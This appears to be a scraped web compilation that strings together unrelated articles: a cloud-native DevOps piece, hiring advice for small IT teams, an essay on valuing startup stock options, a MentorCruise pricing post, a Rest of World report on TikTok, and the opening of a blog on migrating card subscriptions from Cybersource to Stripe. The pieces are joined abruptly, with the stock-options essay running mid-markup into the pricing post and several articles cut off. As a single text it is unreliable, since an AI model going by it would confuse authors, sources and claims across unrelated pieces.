<ul><li><strong>Containerization</strong> enables the creation of environment-agnostic software. It also eliminates implementation conflicts between developers and operation departments, enabling developers and testers to communicate easier.</li><li><strong><a href="https://microtica.com/why-transition-from-monolith-to-microservices/" target="_blank" rel="noreferrer noopener">Going from monolith to microservices</a> </strong>also makes the company more agile. This establishes a set of tools, terms, and processes for both development and operation teams. With microservices, you get sophisticated process automation and an easier transition towards agile product development, which is what continuous delivery requires.</li><li><strong>Using a container orchestration platform</strong>. The most popular is Kubernetes because it solves the challenges related to underlying computing, storage, and networking.</li><li><strong>Automating CI/CD pipelines </strong>in order to reduce complexity and the chances of errors. This automation can save a lot of headaches for developers. Moreover, it allows them to focus on the actual product instead of fixing issues.&nbsp;</li><li>Writing code <strong><a href="https://12factor.net/" target="_blank" rel="noreferrer noopener">according to the 12 factors</a></strong> also makes things more transparent.</li></ul>



<h2>Most common mistakes in adopting cloud-native DevOps</h2>



<h3><strong>Using too many tools</strong></h3>



<p>Once you switch to cloud-native DevOps, you’ll try automating as many processes as possible. However, you don’t do this by just adding and adding tools. You have to pick the right tools and make the best combination that’s right for your application. Overusing tools will also cost you a lot of time and money.&nbsp;</p>



<p>Another mistake here is that developers often get too reliable of a certain tool. The essence of DevOps, however, lies in the team spirit and the implementation of correct practices that contribute to increased productivity and enhanced processes.</p>



<h3><strong>Avoiding continuous monitoring</strong></h3>



<p>While testing inside the implementation pipelines makes the things more straightforward and flowing, it also makes them limited&nbsp; and incomplete. Continuous monitoring, on the other hand, can optimize the entire process by highlighting each malfunction that happens even after the testing.&nbsp;&nbsp;&nbsp;</p>



<h3><strong>Not paying enough attention to security</strong></h3>



<p>Security checks can be quite time-consuming and costly. Teams often think of that security checking capabilities as something that is put to use within the CI/CD workflows. The implementation of a separate tool that takes care of security is a critical move for DevOps to turn and avoid any vulnerabilities in the process.</p>



<h3><strong>Making the transition too fast</strong></h3>



<p>Adopting cloud-native DevOps should be a slow process with a lot of learning on the way. Expecting a company that has been using on-premise applications to immediately align all their structures and platforms into a single cloud-native architecture is simply impossible. Maybe you can quickly make new cloud-native applications, but transitioning existing applications will take a while.&nbsp;</p>



<p>The best solutions would be to go step-by-step. Start by migrating applications to the cloud and continue with transitioning from monolith to microservices. Then, you can set up containers and container orchestration platforms. However, none of this will be successful unless you undergo the culture shift we talk about so much.&nbsp;</p>



<h2>To wrap things up</h2>



<p>Effective implementation of cloud-native DevOps helps businesses to market fresh technologies more rapidly, speeding up their digital transformation. Through cutting enormous cloud costs and rising efficiency and performance, the cloud-native approach has become a blessing to companies with software products. Completely relying on the potential of cloud-native DevOps, unlocks on-demand, unlimited software development powers.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Hiring IT employees for a small company</h2>
<p>We are going to talk about a complicated topic here – hiring IT employees for a small company. Such companies may make mistakes thinking that they are not any different from bigger companies in terms of abilities, perception and/or position. However, it’s not right. The resources of big companies are much more vast and it lets them offering the conditions of work and salaries higher. A lot of people are lured by the idea of working in a big company, getting to the top, become a head of the department and see how such companies run. However, there are people who would be attracted to your company and you should organize competitive work conditions. The people at your hub are going to get the job and be proud of what they do. You need to create your own approach. Not all of the people like working in big companies. Sometimes people are tired of complicated processes and want to work more flexibly so they could see the result sooner. This possibility you need to underline when hiring. Don’t try to compete with moguls.</p>
 
<p>Here I would like to give you some basics you should be aware of when hiring to the IT dep of a small company. </p>
<h2>So, here’s what you need to pay attention first:</h2>
<ul><li>
The department should have the exact minimum of people for high performance. Huge number of employees is too expensive for small companies. You won’t have that many tasks as well. When hiring a lead avoid a person who used to (or wants to) head numerous departments. See if they want to adapt to new conditions. Otherwise you are going to get a lot of requests for hiring more people in order for them to feel more prominent (and in this case they are simply heading towards right direction for him/herself – without any consideration for the company). Try not to hire people who feel good just with a lot of employees below them. This is going to frame you a lot. However, there are some minimum requirements when it comes to the lower amount of people you need. Hire two people of each role (developers, designers…). Your business should not be at risk because of the sick days or annual holidays, not talking about dismissal.  Obviously, you can’t have two leads, but you can help your lead to raise a deputy.
</li><li>
Hire result-oriented ones. A few people have this essential quality. No matter what experience or skills a person has. Some people try to make things faster and better, the others complicate things or over research it (just in case some new framework will make their lives better). At the end the first group gets to the point faster and your company becomes more competitive on the market. The second group may consist of the smartest, but they finish late or demand a lot of effort from their management to finish at all. In order to distinguish one group from another, you need to talk to people, see their preferable working process and find out how they solved problems at their previous workplace. If you need any help in hiring people, we can assist you.
</li><li>
Business dep doesn’t care about technology stack. They care that a task can be carried out on it. In other words they don’t care if it’s written on Python, Ruby, PHP or any other language or if you’re using Postgres, Mongo etc. The most important is to make things work as they should and so the new features were brought in accordance with deadlines. This means that if you are not a professional in this area, leave the decision to your Teach Lead. That’s why you hired this person. The only advice is to avoid stack abundance on your project (i.e. a lot of various programming languages, databases etc.) – thus eventually you will need a lot of specialists with different competencies to support your project.
</li><li>
Don’t hire only leads and seniors. This is going to cost you a lot in terms of motivation and retention. You won’t have enough of difficult tasks for them and you won’t be able to give them subordinates. All this is going to demotivate them a lot.
</li></ul>
 <h2>Some typical issues with hiring people to small companies</h2>
<p>Let’s speak about typical issues with hiring people to small companies. The main issue is competition with the more prominent players on the market. It’s going to be this way, and you need to understand that every company is desperate for people (and here we are talking about the people who are able solve your problems).</p>
 
<p>So, what issues may come up when we are talking about hiring:</p>
 
<ul><li>
The salaries in IT world are growing as hell; you need to be constantly aware of this. With the pay below the market you won’t find a strong team.
</li><li>
Choose people whose wishes you can make true. In other words if a person wants to be promoted 5 times this year and you simply don’t have such a hierarchy, don’t fool with his/her expectations. At the end you’ll have a disappointed employee. If a person is looking for a big team – it’s not your perfect hire for now as well.
</li><li>
Huge corporations have a lot of perks besides the salary. Also they offer big hierarchy and a lot of people.
</li></ul>

<h2>What do you need to remember</h2>
<p>It doesn’t mean you should sit tight and throw your plans to the trash. You should just be aware of a couple of things:</p>
 
<ul><li>
Offer the real market salary – don’t try to wrap candidates around your finger. This way you are going to get demotivated employees and a bad reputation out there (and it will happen quite quickly because of online communications).
</li><li>
Prominent players are not everyone’s dream. Hierarchy and bureaucracy can make people to change the job or even avoid such companies whatsoever. Those people are your target audience. Don’t worry, this type of employees includes both strong and weak specialists, but their overall amount is not that small anyway. After hiring such people always remember to discuss all the improvements you want to implement. They may be perceived as a bureaucracy sometimes (i.e. precise planning of the tasks). Don’t worry, all the reasonable changes are going to be adopted and all the questionable ones will be pointed at. Just listen to your team.
</li><li>
Don’t play with people’s expectations. In small companies the mood of a team is important. If you have hired a person to lead two developers, he/she should lead them. If he/she doesn’t do that, give them a clear performance feedback. Another example is when you promised a bonus upon completion of a task. In this case you should give it to him/her when they have met an objective. Thus, people are going to value your company for an openness and truthfulness. It will pay you back with the motivation and high employee retention rate.
</li><li>
Motivate good employees. When we are talking about big companies, there is no time to watch every employee closely. In your case you are actually able to help a person grow, strengthen his/her motivation and wish to stay with you. It’s important to give a person the feeling of responsibility, show that they are needed. You also need to arrange the room for employees’ growth (you offer market salary, right?).
</li></ul>
 
<p>Again, if you need help with the choosing of stack or hiring people, you can always turn to the ones who have experience with that. </p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h3>[ 2020-December-05 19:55 ]</h3>
<p>When accepting a job or working at a startup, you need to understand what startup options might be worth. In this article, I'll describe the simple models I use. I learned about options during the 7 years of my career running a startup (failed), then working for one (still doing well!). Stock options are a complicated subject, and I will not explain anything other than how I personally estimate their value. My advice is probably wrong. Like any financial decision, you should research your choices carefully. If you want to understand startup stock options in depth, I recommend the book <a href="https://www.venturedeals.com/">Venture Deals: Be smarter than your lawyer and your venture capitalist</a>.</p>

<h2>Trivial model: Your options are worthless</h2>

<p>Assume your stock options are worth $0. If this is true, will you still take the job, or stay with your employer? If the answer is no, I recommend looking for other jobs. There are many, many ways that startup stock will become worthless. The company can go bankrupt. It can have financial trouble, and dilute existing investors in order to raise money (research: "down round"). It can be purchased for a small enough amount of money that investors get all of it (research: "liquidation preference"). It can continue to exist for a long time, either as an independent company, or be acquired by another private company for stock. The average outcome for a startup is that it is worth $0, since most startups fail. You should estimate how likely you think this is, based on what you know about the company. However, you should be pessimistic, since even high-flying companies can run into challenges (e.g. WeWork, Theranos, and many, many others). I like to assume that even good startups have at least a 50% chance of being effectively worth $0.</p>

<p>This does not mean you should never consider working for a startup. However, you should have good reasons other than the potential financial reward. The reliable way to earn a lot of money in the software industry, at least for the last 20-30 years, is to work at a big publicly traded software company. However, small companies have other advantages. Working at a small company gives you more responsibility and an environment with a higher rate of change. In the best startups, this means you can learn different skills, and might learn at a faster rate than at a large company. More specifically, I think that startups provide much better insight into how businesses work. You will get more exposure to important concepts like revenue, cost of good sold, and the cost to acquire customers. At large companies, other job functions are very remote, so you are isolated from having to know anything about them.</p>

<p>As a personal disclosure, at the time of writing, I am working at Datadog, which I consider a big company. However, working at startups taught me an enormous amount about the business of software. I do not regret my choices, even though I likely would have made more have working at Google, Twitter, or any other publicly traded company. (Although that could still change! Come on <a href="https://www.bluecore.com/">Bluecore</a>, I'm rooting for you!) I would also consider working for another startup, or even starting my own again at some point in the future.</p>

<h2>Financial model: Value the company</h2>

<p>The next approach is to estimate how valuable the company is. You can then compute your stock value = (company value)×(ownership fraction). This is very hard, and professional investors make or break their careers on their ability to do this. However, even a simple model is useful, as long as you recognize that it is probably wrong. I like to assume that I have a 50% chance of the stock being worth $0, a 40% chance of getting the money I use to exercise the options back, and a 10% chance of the stock being worth something. This means that my risk-adjusted "expected value" of the stock is approximately 1/10th the estimated value. Another way of saying this is you should believe that your options have some chance at being worth 10× what you will pay to exercise them. If this sounds crazy, you should walk. Again, you should adjust the chance of the stock being worth something based on your opinion of the company, since every company is different. But again, be pessimistic! It is easy to be sentimental for companies that you have worked for, or where you know employees personally.</p>

<p>To compute the ownership fraction, you should ask the company for the total number of outstanding shares, including the options pool. Private companies are sometimes hesitant to provide this information. If they don't want to divulge, I like to tell them that means I have to assume the stock is worthless when comparing their offer to other companies. This should motivate them to share some information, or you should take a job elsewhere. It is a bad sign if your employer lacks transparency for a basic thing like company value.</p>

<p> The numbers I like to use to estimate the company value are:</p>

<ul>
<li><strong>Last 409a valuation</strong>: The 409a valuation is an IRS requirement, and is the "fair market value" of common stock, based on <a href="https://carta.com/blog/what-is-a-409a-valuation/#jumpto6">a number of evaluation methodologies</a>. I think of this as a "low" estimate. It is supposed to be approximately what an investor would pay for a share of common stock, at the time of the estimate. The company is either worth more than this in the future, or it is worth $0. This mean you should consider a range of values, based on your opinion of how fast the company is growing (e.g. maybe 1×, 2×, 5×, 10×?). If you are a current employee, this number should be available to you, since you need it for tax purposes if you exercise your options.</li>

<li><strong>Last round valuation</strong>: At the last round of investment, professional investors believed they could earn a profit by buying shares at this price. In one way, this is a low estimate because it was made some time in the past. You can only sell the shares in the future, if the company has grown and is more valuable. However, this is also a high estimate because as an employee you have common shares, while investors have preferred shares. Preferred shares are less risky because they typically have a liquidation preference, so therefore are worth more.</li>

<li><strong>Multiple of annual recurring revenue (ARR)</strong>: A rough way to value companies, particularly SaaS companies, is to assume they are worth some multiple of their revenue. <a href="https://tomtunguz.com/valuation_multiples_2020-03-02/">An evaluation of public company SaaS revenue multiples in March 2020</a> showed that the average public SaaS company has a valuation that is about 6-8× their ARR. However, the faster the growth, the higher the valuation, so it ranges from 30× to 1×. You should calculate a range of values, based on how fast you think the company is growing.</li>

<li><strong>Comparable acquisitions/fundraising (high)</strong>: If you know of similar or competing businesses that have recently raised money or have been acquired, you can use their valuations. You will need to scale them to match the size of the company and to adjust for differences in their businesses. This is complicated because no two businesses are the same, and you need to know about comparable events. I usually don't bother with this, unless you know of something relevant.</li>
</ul>


<h2>Regret minimization</h2>

<p>After I have some rough idea of what the company might be worth, I like to imagine how I will feel in the future in two scenarios:</p>

<ul>
<li>The stock is worth $0, and I exercised my options or accepted the job: How bad will I feel about losing this money, or about the other job opportunities I passed up?</li>
<li>The stock is worth something, and I did not exercise my options or passed on the job: How bad will I feel hearing about how much money I could have made?</li>
</ul>

<p>I find it useful to think about what choices I will regret the least. Avoiding regret is why I usually advise people leaving a startup to exercise some of their options (e.g. $100-1000), even if they think the company is not doing well. If I walked away from options after working at a company for some time, then later learned those options would have been worth something, I would be very annoyed at myself. If you own at least a token amount, you can share in any potential future success, while limiting the amount you might lose.</p>

At <a href="https://mentorcruise.com/">MentorCruise</a>, pricing is moving and changing all the time, but in 2020  there were two really big changes, can you spot them?</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffd12fe6f-3fac-4e7a-af30-d3a64996fa13_1306x612.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ffd12fe6f-3fac-4e7a-af30-d3a64996fa13_1306x612.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/fd12fe6f-3fac-4e7a-af30-d3a64996fa13_1306x612.png&quot;,&quot;height&quot;:612,&quot;width&quot;:1306,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:72638,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>I’ve made it easy for you, but let me walk you through it :)</p><p>In <strong>March 2020</strong>, I decided to push for a monthly subscription model. Previously, mentees were able to pay weekly and one-off rates and churned quickly at the sight of those many transactions. Going with longer windows yielded longer mentorships.</p><p>That growth compounded to something along a 600% growth in just six month, but it was harder to pull off than just setting up a new pricing plan.</p><p>While great for creating longer lasting mentorships, mentors were now getting access to their funds a lot slower.</p><p>Previously, if they had set up weekly calls, they got funds sent to their accounts not more than 7 days after. Now, they would take up to a month to clear!</p><p>Documentation and customer support were crucial here to explain these new delayed payouts.</p><p>Then, in <strong>September 2020</strong>, I felt locked in by my fee structure. From any transaction I would take a 20% cut. Pricing was in the hand of mentors. That didn’t allow me to expand and experiment on that front a lot.</p><p>While transparent, it’s also a fee structure that hurts to see. Frequently I would get messages why after all fees a mentor would only receive $78 out of their $100 price tag.</p><p>So, I ran a wide migration that would give mentors 100% of what they wanted to charge and put my own fees on top. On one side, that made the prices go a little higher, but would give me a change to experiment with that cut, run promotions, try and round to $xx9 instead of $xx0, all without adjusting the partner agreement.</p><p><strong>So, let’s stop with the anecdotes. Pricing changes in the right direction are worth it, but how are they done right?</strong></p><p>1) If you are building something new, my advice would be to choose a structure that does not limit your freedom. Agree on a flat fee with your suppliers, then experiment with whatever fee or pricing you put on top.</p><p>If you work on something where pricing changes require you to change partner agreements, work on one last migration that will get you away from that.</p><p>2) If you do need to change partner agreements, provide an option to be grandfathered or opt out. For example, a few months into operations, we started to provide a 7-day trial at MentorCruise. Three mentors opted out, but were later convinced by the far more superior numbers.</p><p>3) Look into non-commission based pricing schemes. For example, sites like MicroAcquire charge a subscription for access and a lot of the revenue of ebay comes from advertising.</p><p>4) Communicate! Pricing changes that are visible to suppliers will always produce customer support load, be braced for it.</p><p>Going for a marketplace structure should not limit the decisions you can take around pricing.</p><p>Instead, they should be a tool you can utilize to get more high-quality leads to your suppliers and hopefully more money in everyone’s pockets.</p><p>As you can see, even for marketplace getting to the right pricing scheme is immensely valuable!</p></div></div>]]>

December 7, 2020 | https://restofworld.org/2020/the-year-of-tiktok/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/the-year-of-tiktok/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>O</span>n May 22, a young woman in Cairo named Aya Khamees uploaded a video to <a href="https://restofworld.org/2020/do-you-even-tiktok-tiktok/">TikTok</a> that would alter the course of her life. The 18-year-old was already a small-time star on the social media platform, where she posted singing and dancing clips under the name Menna Abdel Aziz. In the <a href="https://www.bbc.com/arabic/tv-and-radio-52799921">video</a>, which is no longer available on the app, Khamees appears to have a black eye, and the right side of her face is scratched. Looking into the camera, she recounts how she was beaten and brutally raped at a party, as her attackers filmed the acts. “If the government is watching, I want them to go out and get me my rights,” she says.</p>



<p>The clip quickly went viral. Police later arrested everyone who attended the gathering, including Khamees, <a href="https://www.nytimes.com/2020/10/30/world/middleeast/egypt-rape-assault-women-metoo.html"><em>The New York Times</em></a> reported. She was charged with drug use, prostitution, and violating “family values.” On social media, a flood of supporters began <a href="https://egyptianstreets.com/2020/09/18/prosecution-orders-release-of-tik-tok-girl-menna-abdulaziz/">using hashtags</a> like #حق<em>منه</em>عبدالعزيز (It’s Menna Abdel Aziz’s right), sparking a reckoning in Egypt over how the country treats victims of sexual violence. After the case received widespread attention and Khamees completed a rehabilitation program, the charges against her were dropped. But her experience is <a href="https://www.accessnow.org/egypt-women-jailed-for-tiktok/">far from an anomaly</a>.&nbsp;</p>



<p>Since April, Egyptian authorities have arrested at least ten female TikTok influencers for violating draconian internet laws, according to <a href="https://www.amnesty.org/en/latest/news/2020/08/egypt-survivors-of-sexual-violence-and-online-abuse-among-prosecuted-women-tiktok-influencers/">Amnesty International</a>. The troubling incidents are a reflection of Egypt’s conservative, male-dominated government, but they are also an extreme example of the political and content moderation challenges that TikTok is facing around the world. TikTok is owned by the Chinese tech giant ByteDance, and according to Egyptian <a href="https://www.almasryalyoum.com/news/details/2024299">media</a>, the Chinese ambassador informed Egyptian officials that it respected the country’s decisions in the cases and would remove illegal content in the future.</p>



<p>Over the past two years, TikTok has quickly grown into a global sensation. Roughly <a href="https://www.cnbc.com/2020/08/24/tiktok-reveals-us-global-user-growth-numbers-for-first-time.html">700 million</a> people now use the platform each month. The app has been installed close to 940 million times in 2020, up 30% from 2019, according to estimates from the market research firm Sensor Tower. Some turn to TikTok for entertainment or distraction, but others are increasingly using it to push boundaries, shaping the future of digital culture in the process.</p>



<p>Their fate depends on whether TikTok will effectively manage the massive community it has built or, instead, make the same mistakes its predecessors did when it comes to free speech, misinformation, and safety. I’ve spent the better part of the past 18 months covering TikTok as a reporter at <em>Wired, </em>and now as an editor at <em>Rest of World. </em>After a while, I came to realize that the company faces three related problems, all of which will be familiar to anyone who has followed Google or Facebook over the past decade. The difference is that TikTok may be less equipped to handle them.</p>



<p>The first problem is related to content moderation and trust. When TikTok began exploding in popularity in 2018, its website listed a short set of rules banning extreme forms of behavior, such as violence and pornography. Facebook, meanwhile, has long had extensive community guidelines covering hundreds of scenarios (though they’re <a href="https://restofworld.org/2020/pressing-pause-on-fake-news-in-myanmar/">far from</a> totally effective). TikTok has <a href="https://www.wired.com/story/tiktok-overhauls-community-guidelines/">strengthened</a> its policies <a href="https://www.nytimes.com/2020/10/21/technology/tiktok-qanon.html">several times</a> in the past two years, prohibiting hate speech and limiting the spread of <a href="https://www.npr.org/2020/10/18/925144034/tiktok-tightens-crackdown-on-qanon-will-ban-accounts-that-promote-disinformation">conspiracy theories</a> like QAnon. But these improvements came only after it had weathered a series of damaging scandals over censorship.</p>



<p>In its early days, TikTok <a href="https://www.theguardian.com/technology/2019/sep/25/revealed-how-tiktok-censors-videos-that-do-not-please-beijing">said</a> that the company “took a blunt approach to minimizing conflict on the platform,” penalizing users for discussing controversial topics, like tensions between ethnic or religious groups. The company appeared determined to avoid any chance of controversy. (It often claimed its mission was to “<a href="https://www.wsj.com/articles/tiktok-wants-to-stay-politics-free-that-could-be-tough-in-2020-11578225601">bring joy</a>” rather than, say, host political discussions.) That strategy may have been an extension of how ByteDance is forced to operate in China, where it runs a domestic version of TikTok, as well as other widely used social media platforms.&nbsp;</p>



<p>Internet companies in China are required to abide by broad and ever-changing guidelines regarding the types of speech that must be censored. A few years ago, the Chinese government cracked down on ByteDance, accusing it of hosting salacious material, including videos of teen mothers glamorizing their pregnancies. CEO Zhang Yiming quickly <a href="https://www.newyorker.com/news/daily-comment/why-china-cracked-down-on-the-social-media-giant-bytedance">apologized</a> and promised that his company would do a better job policing users in the future.</p>



<p>Media outlets like <em>The Guardian </em>later reported that TikTok had instructed moderators to blacklist videos advocating for <a href="https://www.theguardian.com/technology/2019/sep/26/tiktoks-local-moderation-guidelines-ban-pro-lgbt-content">gay rights</a> and featuring <a href="https://www.theguardian.com/technology/2019/sep/25/revealed-how-tiktok-censors-videos-that-do-not-please-beijing">topics sensitive</a> to Beijing, including Tibetan independence. In March, <em>The Intercep</em>t <a href="https://theintercept.com/2020/03/16/tiktok-app-moderators-users-discrimination/">revealed</a> that TikTok had suppressed posts from “ugly” and poor users, allegedly in an attempt to stem bullying. TikTok said that the guidelines were outdated, but it still looked as though the company had copied and pasted policies from China to the rest of the world.</p>



<p>The fallout was disastrous: Users and journalists <a href="https://www.washingtonpost.com/technology/2019/09/15/tiktoks-beijing-roots-fuel-censorship-suspicion-it-builds-huge-us-audience/">accused</a> TikTok of censoring other content that might upset the Chinese government, such as protests in Hong Kong and a video <a href="https://www.theverge.com/2019/11/28/20986867/tiktok-unblock-us-teen-china-criticism-muslim-minority-terrorist-imagery-moderation-guidelines">that raised awareness</a> about China’s internment camps for <a href="https://restofworld.org/2020/counter-surveillance-revolution/">Muslim minorities</a> (TikTok denied the claims). In response to growing suspicion from users and government officials, the company spent much of 2020 trying to <a href="https://www.wired.com/story/tiktok-under-scrutiny-china/">move away</a> from China and remodel itself as a <a href="https://www.tiktok.com/transparency?lang=en">global social media company</a>.&nbsp;</p>



<p>Its efforts have included releasing <a href="https://www.wired.com/story/tiktok-first-transparency-report/">regular reports</a> about state requests for video removals, which indicated it had never received any from Beijing. It also opened a <a href="https://www.theverge.com/interface/2020/9/11/21430822/tiktok-transparency-visit-tour-algorithms-for-you-page">transparency and accountability center</a> where people can witness TikTok’s moderation practices up close. But it’s not clear whether these changes are enough to convince people that TikTok isn’t influenced by its home country. The app is the first social media platform from China to become a truly global success, but its rise comes as residents of many Western nations <a href="https://www.pewresearch.org/global/2020/10/06/unfavorable-views-of-china-reach-historic-highs-in-many-countries/">increasingly</a> view the country’s government unfavorably.</p>

<p>There’s another reason TikTok may be struggling to earn people’s trust: The way the platform is designed. TikTok is the only major social media app driven almost exclusively by artificial intelligence. Instagram and Twitter have also embraced algorithmic curation but are still largely oriented around whom you know or choose to follow. When you open TikTok, you’re greeted by the platform’s central feature, the For You page — an endless stream of videos chosen by an algorithm. What you see is determined by your previous behavior, along with <a href="https://www.wired.com/story/tiktok-finally-explains-for-you-algorithm-works/">other factors</a>, such as the country you’re in and the device you’re using.</p>



<p>The app <a href="https://www.wired.com/story/tiktok-time/">encourages</a> passive consumption, allowing the For You page to determine your preferences, well, for you. There’s no need to follow specific accounts or seek out particular kinds of content (though you certainly can). “That makes the structure and priorities of the algorithm even more important, as it increasingly determines what we watch, read, and hear, and what people are incentivized to create in digital spaces to get attention,” the writer Kyle Chayka wrote in a <a href="https://kylechayka.substack.com/p/essay-how-do-you-describe-tiktok">recent essay</a> about TikTok.&nbsp;</p>



<p>The For You page has proved to be a potent vehicle for creating <a href="https://www.rollingstone.com/pro/features/tiktok-video-app-growth-867587/">hit songs</a> and viral memes as well as for launching the careers of new celebrities. But its inner workings are still largely opaque. It’s hard for users to know what’s actually on the app, or what they might be missing. More than almost any other platform, TikTok may be inadvertently pushing its users into separate spheres, and there are fewer avenues for them to discover when and if that’s happening. (TikTok <a href="https://www.axios.com/inside-tiktoks-killer-algorithm-52454fb2-6bab-405d-a407-31954ac1cf16.html">has said</a> it’s studying the issue.)&nbsp;</p>



<p>The risk is that TikTok will make political polarization worse, directing users to more and more extreme content. “I think algorithmic feeds are playing a big role in the perpetuation and amplification of disinformation,” said Benjamin Grosser, an artist and a professor of new media at the University of Illinois at Urbana-Champaign. His recent project is <a href="https://bengrosser.com/projects/not-for-you/">Not For You</a>, a browser extension that deliberately tries to confuse TikTok’s For You page in order to surface content you might not otherwise see. The signals the plug-in sends are random, but after playing with it for a while, Grosser said he noticed that TikTok consistently promoted videos from the same handful of popular creators. TikTok’s algorithm is a powerful tool for producing culture, and it may be biased in ways that are independent of its users’ preferences.</p>



<hr>



<p>The most obvious challenge TikTok must confront is that governments around the globe simply don’t like it. After a clash broke out along the border between India and China, Indian authorities <a href="https://restofworld.org/2020/the-clock-is-tik-tok-tik-tok/">blocked TikTok</a> along with hundreds of other apps made by Chinese developers. In the United States, the Trump administration similarly moved to ban the platform amid rising tensions with China; the company is <a href="https://www.reuters.com/article/us-usa-tiktok/appeals-court-holding-dec-14-hearing-on-blocked-u-s-tiktok-new-user-ban-idUSKBN28C2VO">still entangled</a> in a complicated legal battle in U.S. courts. Pakistan also <a href="https://restofworld.org/2020/who-is-afraid-of-a-meme/">briefly censored</a> TikTok, though it quickly reversed the decision.</p>



<p>American companies like Facebook and Twitter frequently find themselves banned by repressive regimes. But rarely are they used as a scapegoat for their country of origin. TikTok will likely continue struggling to dissociate itself from ByteDance and China, especially as other nations <a href="https://www.reuters.com/article/us-eu-privacy-tiktok-clearview/eu-watchdog-sets-up-tiktok-task-force-warns-on-clearview-ai-software-idUSKBN23H2PM">begin scrutinizing</a> the company. And Beijing <a href="https://www.scmp.com/economy/china-economy/article/3101362/tiktoks-algorithm-not-sale-bytedance-tells-us-source">has signaled</a> that it’s willing to step in if ByteDance makes any moves it disapproves of, like selling TikTok to an American company, as the Trump administration has demanded.</p>



<p>Aside from the world’s biggest superpowers, TikTok will need to navigate thorny relationships with leaders from a slew of other nations where it’s quickly gaining millions of new users. Its stated values will likely be tested. Two years ago in Indonesia, for example, the government <a href="https://www.reuters.com/article/us-indonesia-bytedance/indonesia-overturns-ban-on-chinese-video-app-tik-tok-idUSKBN1K10A0">reportedly</a> …</p></div></div>

        <p><strong>NOTE: Although I am a Stripe employee, this is my personal blog. None of what I will describe has an official recommendation from Stripe. Additionally, if you follow me down this migration path, ensure that you do so in a manner that is compliant with the</strong> <a href="https://www.pcisecuritystandards.org/document_library"><strong>PCI Data Security Standard (PCI DSS)</strong></a><strong>.</strong></p>

<p>In <a href="https://dev.clintonblackburn.com/2020/11/28/under-the-hood-of-mitcnc.org.html">my last post</a> I provided an overview of the changes I’ve made to mitcnc.org. This post details the work done to migrate our annual memberships from iModules+Cybersource to WordPress+Stripe.</p>

<p>Prior to the migration I wrote a <a href="https://gitlab.com/mitcnc/wordpress-stripe-plugin">WordPress Stripe plugin</a> to integrate with <a href="https://stripe.com/payments/checkout">Checkout</a> and the <a href="https://stripe.com/docs/billing/subscriptions/customer-portal">customer portal</a>, and render a membership level page. Our membership levels (e.g., Sustaining for $50, or Patron for $100) are pretty straightforward. Each level is modeled as a product with at least one price. The WordPress plugin allows us to determine which prices will be displayed to members at checkout time. A separate plugin—that is more specific to the needs of MITCNC, so not part of the plugin linked above—utilizes filters from the Stripe plugin to apply a discount for recent graduates, and render a lifetime membership level for members of the Cardinal &amp; Gray Society (graduates of 50+ years).</p>

<p>The early investment in the plugin was key to getting support from MITCNC leadership and MITAA staff for this migration. A demo on our staging site provided a tangible experience these stakeholders could play with and compare to the iModules experience. Since I relied on Stripe to handle much of the UX, I only had to focus on building a single page where new members can select a membership level, or existing members can click through to the customer portal.</p>

<p>Writing the code and modeling the memberships was the easy part! Migrating card data from Cybersource to Stripe was far more difficult. I inquired within Stripe to learn more about what I should expect from the migration process. I was disappointed, but not surprised, to learn that Cybersource tends not to play nicely when users want to migrate to a different payment processor. They take a long time to send data, and the data is often incomplete. I opened support requests with Cybersource and further learned the process would take six to eight weeks and cost $500. Given the uncertainty of this process, I exercised an option I was surprised Cybersource offered: transferring unmasked account numbers via API.</p>

<p>Cybersource gave us the option to retrieve account numbers via API. Stripe gave us the option to transmit account numbers via API. After weighing the risks (e.g., a malicious actor gets access to the card numbers) against our need to maintain revenue and offer a better user experience, we decided to proceed with this option.</p>

<p>My one rule for this migration was: account numbers are never stored to disk. No CSVs. No databases. Card numbers are read from Cybersource’s API and immediately transmitted via Stripe’s API (both utilizing TLS). My laptop was physically secure, so there was minimal risk of someone (a) knowing I was running the migration script, (b) breaking into my lobby and elevator, (c) breaking down my apartment door, and (d) freezing my laptop so they could read the DRAM contents and steal a few account numbers. (Note: If you are that desperate for money, just ask for some. I am happy to give you some money and spare the insurance deductible.)</p>

<p>I wish I could say the migration script was as simple as making a couple API calls. Unfortunately Cybersource doesn’t make it as simple to get subscription data. Stripe has a list endpoint that allows me to retrieve a paginated list of all subscriptions. Easy. Cybersource doesn’t have such an API, and requires two separate identifiers—merchant reference code and subscription ID—to retrieve a single subscription. Neither of these identifiers is available in the data I am able to export from iModules, but they are available in daily Cybersource transaction reports.</p>

<p>The first script I wrote downloaded a year of daily transaction reports by making one API call per day. I distilled the logs solely to those associated with subscriptions, filtering out one-off transactions, and stored the data as both a CSV and in a SQLite database. It is important to note that this data did <em>not</em> include account data, hence my willingness to store it on disk. I originally stored the data solely as a CSV that was later loaded by a separate migration script. However, I later realized that I needed the ability to transact on the data to group related transactions (e.g., a member renewed their membership mid-year), and to keep track of which subscriptions had been migrated. I opted to use SQLite for this purpose since my dataset was small (&lt;2000 rows).</p>

<p>The actual migration script is pretty straightforward:</p>

<ol>
  <li>Read a row from the database.</li>
  <li>Pull the account data from Cybersource.</li>
  <li>Determine the Stripe product/price based on the subscription amount.</li>
  <li>Get, or create, a customer at Stripe using the email address as a primary key.</li>
  <li>Get, or create, a payment method at Stripe using the card brand and last four digits as a compound primary key.</li>
  <li>Get, or create, the subscription from Stripe using the Cybersource subscription ID (stored in Stripe metadata) as a primary key.</li>
  <li>Write the Stripe IDs to the database row.</li>
  <li>Cancel the Cybersource subscription.</li>
</ol>

